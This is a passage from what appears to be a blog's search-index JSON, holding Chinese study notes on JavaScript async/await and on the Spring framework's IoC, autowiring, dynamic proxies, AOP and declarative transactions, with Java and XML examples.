的解决,如果等的是正常的表达式则立即执行\n\n3)async&#x3D;&#x3D;&gt;同步转异步\n方法体内部的某个表达式使用await修饰，那么这个方法体所属方法必须要用async修饰所以使用awit方法会自动升级为异步方法\n\n4)mdn文档\nasync\nawait\n\nasync函数\n函数的返回值为promise对象\npromise对象的结果由async函数执行的返回值决定\n\nawait表达式\n\nawait 右侧的表达式一般为 promise 对象, 但也可以是其它的值\n如果表达式是 promise 对象, await 返回的是 promise 成功的值\n如果表达式是其它值, 直接将此值作为 await 的返回值\n\n\n注意\n\nawait 必须写在 async 函数中, 但 async 函数中可以没有 await\n如果 await 的 promise 失败了, 就会抛出异常, 需要通过 try…catch 捕获处理\n\n\n","categories":["Promise"],"tags":["async","await"]},{"title":"Spring","url":"/2023/02/17/SSM%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9ASpring/","content":"IOC（Inversion of Control)控制反转IOC容器IOC思想\nIOC：Inversion of Control，反转控制。\n\n反转控制：完全颠覆了应用程序组件获取资源的传统方式（new一个对象），反转了资源的获取方向——改由容器主动的将资源推送给需要的组件，开发人员不需要直到容器是如何创建资源对象的，只需要提供接收资源的方式即可。这种行为也称为查找的被动形式。\n\nDI：Dependency Injection，依赖注入。\n\nDI是IOC的实现方式：即组件以一些预先定义好的方式（例如：setter方法）接受来自于容器的资源注入。依赖注入就是容器对当前类的属性进行赋值。\n结论：IOC就是一种反转控制的思想，而DI是对IOC的一种具体实现。\nIOC容器再Spring中的实现Spring的IOC容器就是IOC思想的一个落地的产品实现。IOC容器中管理的组件也叫做bean。再创建bean之前，首先需要创建IOC容器。Spring提供了IOC容器的两种实现方式：\n\nBeanFactory\n这是IOC容器的基本实现，是Spring内部使用的接口。面向Spring本身，不提供给开发人员使用。\n\nApplicationContext\nBeanFactory的子接口，提供了更多高级特性。面向Spring的使用者。\n\nApplicationContext的主要实现类\n\n\n\n类型名\n简介\n\n\n\nClassPathXmlApplicationContext\n通过读取类路径下的 XML 格式的配置文件创建 IOC 容器对象\n\n\nFileSystemXmlApplicationContext\n通过文件系统路径读取 XML 格式的配置文件创建 IOC 容器对象\n\n\nConfigurableApplicationContext\nApplicationContext 的子接口，包含一些扩展方法refresh() 和 close() ，让 ApplicationContext 具有启动、关闭和刷新上下文的能力。\n\n\nWebApplicationContext\n专门为 Web 应用准备，基于 Web 环境创建 IOC 容器对象，并将对象引入存入 ServletContext 域中。\n\n\n\n\nbean的作用域概念在Spring中可以通过配置bean标签的scope属性来指定bean的作用域范围，各取值含义参加下表：\n\n\n\n取值\n含义\n创建对象的时机\n\n\n\nsingleton（默认）\n在IOC容器中，这个bean的对象始终为单实例\nIOC容器初始化时\n\n\nprototype\n这个bean在IOC容器中有多个实例\n获取bean时\n\n\n如果是在WebApplicationContext环境下还会有另外两个作用域（但不常用）：\n\n\n\n取值\n含义\n\n\n\nrequest\n在一个请求范围内有效\n\n\nsession\n在一个会话范围内有效\n\n\nbean的生命周期具体的生命周期过程\n实例化：bean对象创建（调用无参构造器）\n依赖注入：给bean对象设置属性\nbean对象初始化之前操作（由bean的后置处理器负责）\nbean对象初始化（需在配置bean时指定初始化方法）\nbean对象初始化之后操作（由bean的后置处理器负责）\nbean对象就绪可以使用\nbean对象销毁（需在配置bean时指定销毁方法）\nIOC容器关闭\n\nFactoryBeanFactoryBean是Spring提供的一种整合第三方框架的常用机制。\n和普通的bean不同，配置一个FactoryBean类型的bean，在获取bean的时候得到的并不是class属性中配置的这个类的对象，而是getObject()方法的返回值。【即获得的是工厂提供的对象，省略了先获取工厂、再获取对象的过程】\n通过这种机制，Spring可以帮我们把复杂组件创建的详细过程和繁琐细节都屏蔽起来，只把最简洁的使用界面展示给我们。\n将来整合Mybatis时，Spring就是通过FactoryBean机制来帮我们创建SqlSessionFactory对象的。\n基于xml的自动装配\n自动装配：根据指定的策略，在IOC容器中匹配某一个bean，自动为指定的bean中所依赖的类类型或接口类型属性赋值\n有了自动装配后，就不需要手动的使用&lt;property ref=&quot;&quot;&gt;标签进行赋值了\n\n使用bean标签的autowire属性设置自动装配效果\n\n自动装配方式：byType\nbyType：根据类型匹配IOC容器中的某个兼容类型的bean，为属性自动赋值\n\n若在IOC中，没有任何一个兼容类型的bean能够为属性赋值，则该属性不装配，即值为默认值null\n\n若在IOC中，有多个兼容类型的bean能够为属性赋值，则抛出异常\n\n\n\n\nNoUniqueBeanDefinitionException\n&lt;bean id=&quot;userController&quot;class=&quot;com.atguigu.autowire.xml.controller.UserController&quot; autowire=&quot;byType&quot;&gt;&lt;/bean&gt;&lt;bean id=&quot;userService&quot;class=&quot;com.atguigu.autowire.xml.service.impl.UserServiceImpl&quot; autowire=&quot;byType&quot;&gt;&lt;/bean&gt;&lt;bean id=&quot;userDao&quot; class=&quot;com.atguigu.autowire.xml.dao.impl.UserDaoImpl&quot;&gt;&lt;/bean&gt;\n\n\n自动装配方式：byName\nbyName：将自动装配的属性的属性名，作为bean的id在IOC容器中匹配相对应的bean进行赋值\n\n\n&lt;bean id=&quot;userController&quot;class=&quot;com.atguigu.autowire.xml.controller.UserController&quot; autowire=&quot;byName&quot;&gt;&lt;/bean&gt;&lt;bean id=&quot;userService&quot;class=&quot;com.atguigu.autowire.xml.service.impl.UserServiceImpl&quot; autowire=&quot;byName&quot;&gt;&lt;/bean&gt;&lt;bean id=&quot;userServiceImpl&quot;class=&quot;com.atguigu.autowire.xml.service.impl.UserServiceImpl&quot; autowire=&quot;byName&quot;&gt;&lt;/bean&gt;&lt;bean id=&quot;userDao&quot; class=&quot;com.atguigu.autowire.xml.dao.impl.UserDaoImpl&quot;&gt;&lt;/bean&gt;&lt;bean id=&quot;userDaoImpl&quot; class=&quot;com.atguigu.autowire.xml.dao.impl.UserDaoImpl&quot;&gt;&lt;/bean&gt;\n\n基于注解管理Bean标识组件的常用注解\n@Component：将类标识为普通组件\n@Controller：将类标识为控制层组件\n@Service：将类标识为业务层组件 \n@Repository：将类标识为持久层组件\n\n创建组件创建控制层组件\n@Controllerpublic class UserController &#123;&#125;\n\n创建接口UserService\npublic interface UserService &#123;&#125;\n\n创建业务层组件UserServiceImpl\n@Servicepublic class UserServiceImpl implements UserService &#123;&#125;\n\n创建接口UserDao\npublic interface UserDao &#123;&#125;\n\n创建持久层组件UserDaoImpl\n@Repositorypublic class UserDaoImpl implements UserDao &#123;&#125;\n\n扫描组件情况一：最基本的扫描方式\n&lt;context:component-scan base-package=&quot;com.atguigu&quot;&gt;&lt;/context:component-scan&gt;  \n\n情况二：指定要排除的组件\n&lt;context:component-scan base-package=&quot;com.atguigu&quot;&gt;    &lt;!-- context:exclude-filter标签：指定排除规则 --&gt;    &lt;!--        type：设置排除或包含的依据        type=&quot;annotation&quot;，根据注解排除，expression中设置要排除的注解的全类名        type=&quot;assignable&quot;，根据类型排除，expression中设置要排除的类型的全类名    --&gt;    &lt;context:exclude-filter type=&quot;annotation&quot;expression=&quot;org.springframework.stereotype.Controller&quot;/&gt;    &lt;!--&lt;context:exclude-filter type=&quot;assignable&quot;expression=&quot;com.atguigu.controller.UserController&quot;/&gt;--&gt;&lt;/context:component-scan&gt;\n\n情况三：仅扫描指定组件\n&lt;context:component-scan base-package=&quot;com.atguigu&quot; use-default-filters=&quot;false&quot;&gt;    &lt;!-- context:include-filter标签：指定在原有扫描规则的基础上追加的规则 --&gt;    &lt;!-- use-default-filters属性：取值false表示关闭默认扫描规则 --&gt;    &lt;!-- 此时必须设置use-default-filters=&quot;false&quot;，因为默认规则即扫描指定包下所有类 --&gt;    &lt;!--        type：设置排除或包含的依据        type=&quot;annotation&quot;，根据注解排除，expression中设置要排除的注解的全类名        type=&quot;assignable&quot;，根据类型排除，expression中设置要排除的类型的全类名     --&gt;    &lt;context:include-filter type=&quot;annotation&quot;expression=&quot;org.springframework.stereotype.Controller&quot;/&gt;    &lt;!--&lt;context:include-filter type=&quot;assignable&quot;expression=&quot;com.atguigu.controller.UserController&quot;/&gt;--&gt;&lt;/context:component-scan&gt;\n\n基于注解的自动装配@Autowired注解在成员变量上直接标记@Autowired注解即可完成自动装配，不需要提供setXxx()方法。\n@Controllerpublic class UserController &#123;    @Autowired    private UserService userService;    public void saveUser()&#123;        userService.saveUser();    &#125;&#125;public interface UserService &#123;    void saveUser();&#125;@Servicepublic class UserServiceImpl implements UserService &#123;    @Autowired    private UserDao userDao;    @Override    public void saveUser() &#123;        userDao.saveUser();    &#125;&#125;public interface UserDao &#123;\tvoid saveUser();&#125;\t@Repositorypublic class UserDaoImpl implements UserDao &#123;    @Override    public void saveUser() &#123;        System.out.println(&quot;保存成功&quot;);    &#125;&#125;\n\n@Autowired注解其他细节\n@Autowired注解还可以标记在构造器和set方法上\n\n@Controllerpublic class UserController &#123;    private UserService userService;    @Autowired    public UserController(UserService userService)&#123;        this.userService = userService;    &#125;    public void saveUser()&#123;        userService.saveUser();    &#125;&#125;@Controllerpublic class UserController &#123;    private UserService userService;    @Autowired    public void setUserService(UserService userService)&#123;        this.userService = userService;    &#125;    public void saveUser()&#123;        userService.saveUser();    &#125;&#125;\n\n\n\nAOP（Aspect Oriented Programming）代理模式概念二十三种设计模式中的一种，属于结构型模式。它的作用就是通过提供一个代理类，让我们在调用目标方法的时候，不再是直接对目标方法进行调用，而是通过代理类间接调用。让不属于目标方法核心逻辑的代码从目标方法中剥离出来——解耦。调用目标方法时先调用代理对象的方法，减少对目标方法的调用和打扰，同时让附加功能能够集中在一起也有利于统一维护。\n\n\n\n\n代理：将非核心逻辑剥离出来以后，封装这些非核心逻辑的类、对象、方法。\n目标：被代理“套用”了非核心逻辑代码的类、对象、方法。\n\n\n静态代理创建静态代理类：\npublic class CalculatorStaticProxy implements Calculator &#123;    // 将被代理的目标对象声明为成员变量    private Calculator target;    public CalculatorStaticProxy(Calculator target) &#123;        this.target = target;    &#125;    @Override    public int add(int i, int j) &#123;        // 附加功能由代理类中的代理方法来实现        System.out.println(&quot;[日志] add 方法开始了，参数是：&quot; + i + &quot;,&quot; + j);        // 通过目标对象来实现核心业务逻辑        int addResult = target.add(i, j);        System.out.println(&quot;[日志] add 方法结束了，结果是：&quot; + addResult);        return addResult;    &#125;&#125;\n\n\n静态代理确实实现了解耦，但是由于代码都写死了，完全不具备任何的灵活性。就拿日志功能来说，将来其他地方也需要附加日志，那还得再声明更多个静态代理类，那就产生了大量重复的代码，日志功能还是分散的，没有统一管理。(因为静态代理是一对一的)\n提出进一步的需求：将日志功能集中到一个代理类中，将来有任何日志需求，都通过这一个代理类来实现。这就需要使用动态代理技术了。\n\n动态代理\n动态：jdk帮助我们动态生成目标类所对应的代理类\npublic class ProxyFactory &#123;    private Object target;    public ProxyFactory(Object target) &#123;        this.target = target;    &#125;    public Object getProxy()&#123;        /**         * newProxyInstance()：创建一个代理实例         * 其中有三个参数：         * 1、classLoader：加载动态生成的代理类的类加载器         * 2、interfaces：目标对象实现的所有接口的class对象所组成的数组         * 3、invocationHandler：设置代理对象实现目标对象方法的过程，即代理类中如何重写接口中的抽象方法         */        ClassLoader classLoader = target.getClass().getClassLoader();        Class&lt;?&gt;[] interfaces = target.getClass().getInterfaces();        InvocationHandler invocationHandler = new InvocationHandler() &#123;            @Override            public Object invoke(Object proxy, Method method, Object[] args)                throws Throwable &#123;                /**                 * proxy：代理对象                 * method：代理对象需要实现的方法，即其中需要重写的方法                 * args：method所对应方法的参数                 */                Object result = null;                try &#123;                    System.out.println(&quot;[动态代理][日志] &quot;+method.getName()+&quot;，参数：&quot;+ Arrays.toString(args));                     result = method.invoke(target, args);                     System.out.println(&quot;[动态代理][日志] &quot;+method.getName()+&quot;，结 果：&quot;+ result);                 &#125; catch (Exception e) &#123;                   e.printStackTrace();                   System.out.println(&quot;[动态代理][日志] &quot;+method.getName()+&quot;，异常：&quot;+e.getMessage());                  &#125; finally &#123;                      System.out.println(&quot;[动态代理][日志] &quot;+method.getName()+&quot;，方法执行完毕&quot;);                  &#125;                  return result;               &#125;               &#125;;                return Proxy.newProxyInstance(classLoader, interfaces,invocationHandler);      &#125;&#125;                                     \n\n\n动态代理有两种：\njdk动态代理：要求必须有接口，最终生成的代理类和目标类实现相同的接口，在com.sun.proxy包下，类名为$proxy+数字\ncglib动态代理，最终生的的代理类会继承目标类，并且和目标类在相同的包下\n\n\n\nAOP概念及相关术语概述AOP（Aspect Oriented Programming）是一种设计思想，是软件设计领域中的面向切面编程，它是面向对象编程（OOP）的一种补充和完善，它以通过预编译方式和运行期动态代理方式实现在不修改源代码的情况下给程序动态统一添加额外功能的一种技术。\n相关术语①横切关注点即从每个方法中抽取出来的同一类非核心业务（从核心代码中抽出出来的非核心代码）。在同一个项目中，我们可以使用多个横切关注点对相关方法进行多个不同方面的增强。\n这个概念不是语法层面天然存在的，而是根据附加功能的逻辑上的需要：有十个附加功能，就有十个横切关注点。\n②通知每一个横切关注点上要做的事情都需要写一个方法来实现，这样的方法就叫通知方法。\n\n前置通知：在被代理的目标方法前执行\n返回通知：在被代理的目标方法成功结束后执行（寿终正寝）return后\n异常通知：在被代理的目标方法异常结束后执行（死于非命）\n后置通知：在被代理的目标方法最终结束后执行（盖棺定论）finally中\n环绕通知：使用try…catch…finally结构围绕整个被代理的目标方法，包括上面四种通知对应的所有位置\n\n③切面封装通知方法的类。\n\n④目标被代理的目标对象。\n⑤代理向目标对象应用通知之后创建的代理对象。\n【在AOP中不需要我们手动创建动态代理工厂】\n⑥连接点这也是一个纯逻辑概念，不是语法定义的。\n把方法排成一排，每一个横切位置看成x轴方向，把方法从上到下执行的顺序看成y轴，x轴和y轴的交叉点就是连接点。\n\n⑦切入点从代码层面定位连接点的方式。\n每个类的方法中都包含多个连接点，所以连接点是类中客观存在的事物（从逻辑上来说）。\n如果把连接点看作数据库中的记录，那么切入点就是查询记录的 SQL 语句。\nSpring 的 AOP 技术可以通过切入点定位到特定的连接点。\n切点通过 org.springframework.aop.Pointcut 接口进行描述，它使用类和方法作为连接点的查询条件。\n作用\n简化代码：把方法中固定位置的重复的代码抽取出来，让被抽取的方法更专注于自己的核心功能，提高内聚性。\n代码增强：把特定的功能封装到切面类中，看哪里有需要，就往上套，被套用了切面逻辑的方法就被切面给增强了。\n\n基于注解的AOP技术说明\n\n动态代理（InvocationHandler）：JDK原生的实现方式，需要被代理的目标类必须实现接口。因为这个技术要求代理对象和目标对象实现同样的接口（兄弟两个拜把子模式）。\n\ncglib：通过继承被代理的目标类（认干爹模式）实现代理，所以不需要目标类实现接口。\n\nAspectJ：本质上是静态代理，将代理逻辑“织入”被代理的目标类编译得到的字节码文件，所以最终效果是动态的。weaver就是织入器。Spring只是借用了AspectJ中的注解。（AOP是思想，AspectJ是AOP的具体实现）\n\n\n创建切面类并配置// @Aspect表示这个类是一个切面类@Aspect// @Component注解保证这个切面类能够放入IOC容器@Componentpublic class LogAspect &#123;    @Before(&quot;execution(public int com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;)public void beforeMethod(JoinPoint joinPoint)&#123;\tString methodName = joinPoint.getSignature().getName();\tString args = Arrays.toString(joinPoint.getArgs());\tSystem.out.println(&quot;Logger--&gt;前置通知，方法名：&quot;+methodName+&quot;，参数：&quot;+args);\t&#125;    @After(&quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;)\tpublic void afterMethod(JoinPoint joinPoint)&#123;\t\tString methodName = joinPoint.getSignature().getName();\t\tSystem.out.println(&quot;Logger--&gt;后置通知，方法名：&quot;+methodName);\t&#125;    @AfterReturning(value = &quot;execution(*com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;, returning = &quot;result&quot;)\tpublic void afterReturningMethod(JoinPoint joinPoint, Object result)&#123;\t\tString methodName = joinPoint.getSignature().getName();\t\tSystem.out.println(&quot;Logger--&gt;返回通知，方法名：&quot;+methodName+&quot;，结果：&quot;+result);\t&#125;     @AfterThrowing(value = &quot;execution(*com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;, throwing = &quot;ex&quot;)\tpublic void afterThrowingMethod(JoinPoint joinPoint, Throwable ex)&#123;\t\tString methodName = joinPoint.getSignature().getName();\t\tSystem.out.println(&quot;Logger--&gt;异常通知，方法名：&quot;+methodName+&quot;，异常：&quot;+ex);\t&#125;    @Around(&quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;)\tpublic Object aroundMethod(ProceedingJoinPoint joinPoint)&#123;        String methodName = joinPoint.getSignature().getName();\t\tString args = Arrays.toString(joinPoint.getArgs());\t\tObject result = null;        try &#123;            System.out.println(&quot;环绕通知--&gt;目标对象方法执行之前&quot;);            //目标对象（连接点）方法的执行            result = joinPoint.proceed();            System.out.println(&quot;环绕通知--&gt;目标对象方法返回值之后&quot;);\t\t&#125; catch (Throwable throwable) &#123;            throwable.printStackTrace();            System.out.println(&quot;环绕通知--&gt;目标对象方法出现异常时&quot;);\t\t&#125; finally &#123;\t\t\tSystem.out.println(&quot;环绕通知--&gt;目标对象方法执行完毕&quot;);\t\t&#125;\t\treturn result;\t&#125;&#125;\n\n各种通知\n前置通知：使用@Before注解标识，在被代理的目标方法前执行\n返回通知：使用@AfterReturning注解标识，在被代理的目标方法成功结束后执行（寿终正寝）【在返回值之后执行】\n异常通知：使用@AfterThrowing注解标识，在被代理的目标方法异常结束后执行（死于非命）【在catch子句中执行】\n后置通知：使用@After注解标识，在被代理的目标方法最终结束后执行（盖棺定论）【在finally子句中执行】\n环绕通知：使用@Around注解标识，使用try…catch…finally结构围绕整个被代理的目标方法，包括上面四种通知对应的所有位置【要和目标对象方法的返回值一致】\n\n各种通知的执行顺序：\n\nSpring版本5.3.x以前：\n前置通知\n目标操作\n后置通知\n返回通知或异常通知\n\n\nSpring版本5.3.x以后：\n前置通知\n目标操作\n返回通知或异常通知\n后置通知\n\n\n\n切面的优先级相同目标方法上同时存在多个切面时，切面的优先级控制切面的内外嵌套顺序。\n\n优先级高的切面：外面\n优先级低的切面：里面\n\n使用@Order注解可以控制切面的优先级：\n\n@Order(较小的数)：优先级高\n@Order(较大的数)：优先级低\n\n基于XML的AOP（了解）实现&lt;context:component-scan base-package=&quot;com.atguigu.aop.xml&quot;&gt;&lt;/context:componentscan&gt;&lt;aop:config&gt;    &lt;!--配置切面类--&gt;    &lt;aop:aspect ref=&quot;loggerAspect&quot;&gt;        &lt;aop:pointcut id=&quot;pointCut&quot; expression=&quot;execution(*com.atguigu.aop.xml.CalculatorImpl.*(..))&quot;/&gt;        &lt;aop:before method=&quot;beforeMethod&quot; pointcut-ref=&quot;pointCut&quot;&gt;&lt;/aop:before&gt;        &lt;aop:after method=&quot;afterMethod&quot; pointcut-ref=&quot;pointCut&quot;&gt;&lt;/aop:after&gt;        &lt;aop:after-returning method=&quot;afterReturningMethod&quot; returning=&quot;result&quot;pointcut-ref=&quot;pointCut&quot;&gt;&lt;/aop:after-returning&gt;        &lt;aop:after-throwing method=&quot;afterThrowingMethod&quot; throwing=&quot;ex&quot; pointcut-ref=&quot;pointCut&quot;&gt;&lt;/aop:after-throwing&gt;        &lt;aop:around method=&quot;aroundMethod&quot; pointcut-ref=&quot;pointCut&quot;&gt;&lt;/aop:around&gt;    &lt;/aop:aspect&gt;    &lt;aop:aspect ref=&quot;validateAspect&quot; order=&quot;1&quot;&gt;        &lt;aop:before method=&quot;validateBeforeMethod&quot; pointcut-ref=&quot;pointCut&quot;&gt;        &lt;/aop:before&gt;    &lt;/aop:aspect&gt;&lt;/aop:config&gt;\n\n声明式事务概念编程式事务事务功能的相关操作全部通过自己编写代码来实现：\nConnection conn = ...;try &#123;    // 开启事务：关闭事务的自动提交    conn.setAutoCommit(false);        // 核心操作        // 提交事务    conn.commit();&#125;catch(Exception e)&#123;    // 回滚事务    conn.rollBack();&#125;finally&#123;    // 释放数据库连接    conn.close();&#125;\n\n编程式的实现方式存在缺陷：\n\n细节没有被屏蔽：具体操作过程中，所有细节都需要程序员自己来完成，比较繁琐。\n代码复用性不高：如果没有有效抽取出来，每次实现功能都需要自己编写代码，代码就没有得到复用。\n\n声明式事务既然事务控制的代码有规律可循，代码的结构基本是确定的，所以框架就可以将固定模式的代码抽取出来，进行相关的封装。\n封装起来后，我们只需要在配置文件中进行简单的配置即可完成操作。\n\n好处1：提高开发效率\n好处2：消除了冗余的代码\n好处3：框架会综合考虑相关领域中在实际开发环境下有可能遇到的各种问题，进行了健壮性、性能等各个方面的优化\n\n所以，我们可以总结下面两个概念：\n\n编程式：自己写代码实现功能\n声明式：通过配置让框架实现功能\n\n基于注解的声明式事务①添加事务配置在Spring的配置文件中添加配置：\n&lt;bean id=&quot;transactionManager&quot;      class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt;    &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;&gt;&lt;/property&gt;&lt;/bean&gt;&lt;!--    开启事务的注解驱动    通过注解@Transactional所标识的方法或标识的类中所有的方法，都会被事务管理器管理事务--&gt;&lt;!-- transaction-manager属性的默认值是transactionManager，如果事务管理器bean的id正好就是这个默认值，则可以省略这个属性 --&gt;&lt;tx:annotation-driven transaction-manager=&quot;transactionManager&quot; /&gt;\n\n注意：导入的名称空间需要 tx 结尾的那个。\n②添加事务注解因为service层表示业务逻辑层，一个方法表示一个完成的功能，因此处理事务一般在service层处理\n在BookServiceImpl的buybook()添加注解@Transactional\n③观察结果由于使用了Spring的声明式事务，更新库存和更新余额都没有执行\n@Transactional注解标识的位置@Transactional标识在方法上，咋只会影响该方法\n@Transactional标识的类上，咋会影响类中所有的方法\n事务属性：只读①介绍对一个查询操作来说，如果我们把它设置成只读，就能够明确告诉数据库，这个操作不涉及写操作。这样数据库就能够针对查询操作来进行优化（比如不加锁）。\n②使用方式@Transactional(readOnly = true)public void buyBook(Integer bookId, Integer userId) &#123;    //查询图书的价格    Integer price = bookDao.getPriceByBookId(bookId);    //更新图书的库存    bookDao.updateStock(bookId);    //更新用户的余额    bookDao.updateBalance(userId, price);    //System.out.println(1/0);&#125;\n\n③注意对增删改操作设置只读会抛出下面异常：\nCaused by: java.sql.SQLException: Connection is read-only. Queries leading to data modification\nare not allowed\n只有当前事务中所有的操作都为查询时才能设置为只读。\n事务属性：超时①介绍事务在执行过程中，有可能因为遇到某些问题，导致程序卡住，从而长时间占用数据库资源。而长时间占用资源，大概率是因为程序运行出现了问题（可能是Java程序或MySQL数据库或网络连接等等）。\n此时这个很可能出问题的程序应该被回滚，撤销它已做的操作，事务结束，把资源让出来，让其他正常程序可以执行。\n概括来说就是一句话：超时回滚，释放资源。\n②使用方式@Transactional(timeout = 3)public void buyBook(Integer bookId, Integer userId) &#123;    try &#123;        TimeUnit.SECONDS.sleep(5);    &#125; catch (InterruptedException e) &#123;        e.printStackTrace();    &#125;    //查询图书的价格    Integer price = bookDao.getPriceByBookId(bookId);    //更新图书的库存    bookDao.updateStock(bookId);    //更新用户的余额    bookDao.updateBalance(userId, price);    //System.out.println(1/0);&#125;\n\n③观察结果执行过程中抛出异常：\norg.springframework.transaction.TransactionTimedOutException: Transaction timed out:\ndeadline was Fri Jun 04 16:25:39 CST 2022\n事务属性：回滚策略①介绍声明式事务默认只针对运行时异常回滚，编译时异常不回滚。\n可以通过@Transactional中相关属性设置回滚策略\n\nrollbackFor属性：需要设置一个Class类型的对象\nrollbackForClassName属性：需要设置一个字符串类型的全类名\nnoRollbackFor属性：需要设置一个Class类型的对象\nrollbackFor属性：需要设置一个字符串类型的全类名\n\n②使用方式@Transactional(noRollbackFor = ArithmeticException.class)//@Transactional(noRollbackForClassName = &quot;java.lang.ArithmeticException&quot;)public void buyBook(Integer bookId, Integer userId) &#123;    //查询图书的价格    Integer price = bookDao.getPriceByBookId(bookId);    //更新图书的库存    bookDao.updateStock(bookId);    //更新用户的余额    bookDao.updateBalance(userId, price);    System.out.println(1/0);&#125;\n\n③观察结果虽然购买图书功能中出现了数学运算异常（ArithmeticException），但是我们设置的回滚策略是，当\n出现ArithmeticException不发生回滚，因此购买图书的操作正常执行\n事务属性：事务隔离级别①介绍数据库系统必须具有隔离并发运行各个事务的能力，使它们不会相互影响，避免各种并发问题。一个事\n务与其他事务隔离的程度称为隔离级别。SQL标准中规定了多种事务隔离级别，不同隔离级别对应不同\n的干扰程度，隔离级别越高，数据一致性就越好，但并发性越弱。\n隔离级别一共有四种：\n\n读未提交：READ UNCOMMITTED\n\n允许Transaction01读取Transaction02未提交的修改。【会出现脏读】\n\n读已提交：READ COMMITTED、\n\n要求Transaction01只能读取Transaction02已提交的修改。【会出现不可重复读】\n\n可重复读：REPEATABLE READ\n\n确保Transaction01可以多次从一个字段中读取到相同的值，即Transaction01执行期间禁止其它\n事务对这个字段进行更新。【会出现幻读，但是mysql中的mvcc可以避免幻读】\n\n串行化：SERIALIZABLE\n\n确保Transaction01可以多次从一个表中读取到相同的行，在Transaction01执行期间，禁止其它\n事务对这个表进行添加、更新、删除操作。可以避免任何并发问题，但性能十分低下。\n各个隔离级别解决并发问题的能力见下表：\n\n\n\n隔离级别\n脏读\n不可重复读\n幻读\n\n\n\nREAD UNCOMMITTED\n有\n有\n有\n\n\nREAD COMMITTED\n无\n有\n有\n\n\nREPEATABLE READ\n无\n无\n有\n\n\nSERIALIZABLE\n无\n无\n无\n\n\n各种数据库产品对事务隔离级别的支持程度：\n\n\n\n隔离级别\nOracle\nMySQL\n\n\n\nREAD UNCOMMITTED\n×\n√\n\n\nREAD COMMITTED\n√(默认)\n√\n\n\nREPEATABLE READ\n×\n√(默认)\n\n\nSERIALIZABLE\n√\n√\n\n\n②使用方式@Transactional(isolation = Isolation.DEFAULT)//使用数据库默认的隔离级别@Transactional(isolation = Isolation.READ_UNCOMMITTED)//读未提交@Transactional(isolation = Isolation.READ_COMMITTED)//读已提交@Transactional(isolation = Isolation.REPEATABLE_READ)//可重复读@Transactional(isolation = Isolation.SERIALIZABLE)//串行化\n\n事务属性：事务传播行为①介绍当事务方法被另一个事务方法调用时，必须指定事务应该如何传播。例如：方法可能继续在现有事务中运行，也可能开启一个新事务，并在自己的事务中运行。\n②测试创建接口CheckoutService：\npublic interface CheckoutService &#123;\tvoid checkout(Integer[] bookIds, Integer userId);&#125;\n\n创建实现类CheckoutServiceImpl：\n@Servicepublic class CheckoutServiceImpl implements CheckoutService &#123;    @Autowired    private BookService bookService;    @Override    @Transactional    //一次购买多本图书    public void checkout(Integer[] bookIds, Integer userId) &#123;        for (Integer bookId : bookIds) &#123;            bookService.buyBook(bookId, userId);        &#125;    &#125;&#125;\n\n在BookController中添加方法：\n@Autowiredprivate CheckoutService checkoutService;public void checkout(Integer[] bookIds, Integer userId)&#123;    checkoutService.checkout(bookIds, userId);&#125;\n\n在数据库中将用户的余额修改为100元\n③观察结果可以通过@Transactional中的propagation属性设置事务传播行为\n修改BookServiceImpl中buyBook()上，注解@Transactional的propagation属性\n@Transactional(propagation = Propagation.REQUIRED)，默认情况，表示如果当前线程上有已经开启的事务可用，那么就在这个事务中运行。经过观察，购买图书的方法buyBook()在checkout()中被调用，checkout()上有事务注解，因此在此事务中执行。所购买的两本图书的价格为80和50，而用户的余额为100，因此在购买第二本图书时余额不足失败，导致整个checkout()回滚，即只要有一本书买不了，就都买不了\n@Transactional(propagation = Propagation.REQUIRES_NEW)，表示不管当前线程上是否有已经开启的事务，都要开启新事务。同样的场景，每次购买图书都是在buyBook()的事务中执行，因此第一本图书购买成功，事务结束，第二本图书购买失败，只在第二次的buyBook()中回滚，购买第一本图书不受影响，即能买几本就买几本\n4.4、基于XML的声明式事务修改Spring配置文件将Spring配置文件中去掉tx:annotation-driven 标签，并添加配置：\n&lt;aop:config&gt;    &lt;!-- 配置事务通知和切入点表达式 --&gt;    &lt;aop:advisor advice-ref=&quot;txAdvice&quot; pointcut=&quot;execution(*com.atguigu.spring.tx.xml.service.impl.*.*(..))&quot;&gt;&lt;/aop:advisor&gt;&lt;/aop:config&gt;&lt;!-- tx:advice标签：配置事务通知 --&gt;&lt;!-- id属性：给事务通知标签设置唯一标识，便于引用 --&gt;&lt;!-- transaction-manager属性：关联事务管理器 --&gt;&lt;tx:advice id=&quot;txAdvice&quot; transaction-manager=&quot;transactionManager&quot;&gt;    &lt;tx:attributes&gt;        &lt;!-- tx:method标签：配置具体的事务方法 --&gt;        &lt;!-- name属性：指定方法名，可以使用星号代表多个字符 --&gt;        &lt;tx:method name=&quot;get*&quot; read-only=&quot;true&quot;/&gt;        &lt;tx:method name=&quot;query*&quot; read-only=&quot;true&quot;/&gt;        &lt;tx:method name=&quot;find*&quot; read-only=&quot;true&quot;/&gt;        &lt;!-- read-only属性：设置只读属性 --&gt;        &lt;!-- rollback-for属性：设置回滚的异常 --&gt;        &lt;!-- no-rollback-for属性：设置不回滚的异常 --&gt;        &lt;!-- isolation属性：设置事务的隔离级别 --&gt;        &lt;!-- timeout属性：设置事务的超时属性 --&gt;        &lt;!-- propagation属性：设置事务的传播行为 --&gt;        &lt;tx:method name=&quot;save*&quot; read-only=&quot;false&quot; rollback-for=&quot;java.lang.Exception&quot; propagation=&quot;REQUIRES_NEW&quot;/&gt;        &lt;tx:method name=&quot;update*&quot; read-only=&quot;false&quot; rollback-for=&quot;java.lang.Exception&quot; propagation=&quot;REQUIRES_NEW&quot;/&gt;        &lt;tx:method name=&quot;delete*&quot; read-only=&quot;false&quot; rollback-for=&quot;java.lang.Exception&quot; propagation=&quot;REQUIRES_NEW&quot;/&gt;    &lt;/tx:attributes&gt;&lt;/tx:advice&gt;\n\n\n注意：基于xml实现的声明式事务，必须引入aspectJ的依赖\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    &lt;artifactId&gt;spring-aspects&lt;/artifactId&gt;    